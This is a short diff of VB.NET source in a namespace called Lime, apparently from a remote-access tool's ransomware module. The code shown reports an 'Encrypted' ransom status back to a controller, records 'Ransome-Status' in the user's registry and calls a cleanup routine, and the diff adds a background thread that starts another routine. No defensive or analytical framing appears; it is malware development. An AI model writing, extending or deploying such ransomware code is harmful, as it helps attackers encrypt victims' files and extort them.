@@ -126,7 +126,11 @@ Namespace Lime
 
                 c.Send(("c_ransome" & c.SPL & "Encrypted"))
                 My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", "Encrypted")
+
                 SC()
+
+                Dim proc As New Threading.Thread(AddressOf MISC.Proc)
+                proc.Start()
                 Exit Sub
             Catch ex As Exception
 
